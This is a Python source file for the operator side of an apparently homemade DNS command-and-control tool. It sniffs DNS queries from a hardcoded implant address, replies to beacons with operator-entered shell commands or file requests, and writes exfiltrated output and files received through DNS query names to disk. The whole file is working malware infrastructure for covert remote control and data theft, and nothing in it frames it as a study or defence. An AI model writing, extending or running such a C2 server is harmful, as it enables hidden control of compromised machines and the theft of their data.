
from dns_c2_modules import *


commands_que = {}
opened_fd = ""


def commands_input():
    global commands_que
    while True:
        if not commands_que:
            words = input("\nEnter type and command (ex: run ls):\n").split ()
            key = words[0]                      #extract the first word as key
            value = ' '.join(words[1:])         # extract all the rest as value
            commands_que = {key: value}   
            print(commands_que)
            

def send_command(packet):
    global commands_que
    if not commands_que:
        return
    print("commands_que:")
    prefix = next(iter(commands_que))           
    print("prefix is: " + prefix)
    command_name = commands_que[prefix]
    print("command is: " + command_name)
    if prefix == RUN_MODEL:
        prefix = RUN
    elif prefix == SEND_MODEL:
        prefix = FILE
    bin_command = bytes(command_name.encode())
	 
    frag_and_send(packet,bin_command,0,0,prefix)

    commands_que = ""
        
    
def parse_packet(packet):
    global opened_fd
    
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        if packet[IP].src != "192.168.1.21":
            return
        prefix_packet = packet[DNSQR].qname[0][:6]
        data_recieved = packet[DNSQR].qname[0][6:]
        if prefix_packet == BEACON:
            send_command(packet)
        elif prefix_packet == BEGIN_OUTPUT:
            opened_fd = open_file(LOG_OUTPUT)
            write_to_file(opened_fd,data_recieved)
        elif prefix_packet == BEGIN_FILE:
            file_name = os.path.basename(data_recieved)
            opened_fd = open_file(file_name)
        elif prefix_packet == IN_TRANSFER:
            write_to_file(opened_fd,data_recieved)
        elif prefix_packet == EF:
            close_file(opened_fd)
            opened_fd = ""
            print("transer complete")
            
def open_file(file_name):
	flags = os.O_WRONLY|os.O_CREAT|os.O_APPEND
	fd = os.open(file_name,flags)
	return fd

def write_to_file(fd,to_write):
    print(type(fd))
    print(type(to_write))
	#encoded_content = to_write.encode('utf-8')
	#os.write(fd,encoded_content)
    os.write(fd,bytes(to_write))

                     
def server_listen():
    sniff_pkt(pfilter="udp and port 53",handler=parse_packet)
    
if __name__=="__main__":
    signal.signal(signal.SIGINT, signal_handler)

    enter_command_thread = threading.Thread(target=commands_input)
    enter_command_thread.start()

    print("start listening")
    server_listen()    # Start sniffing packets





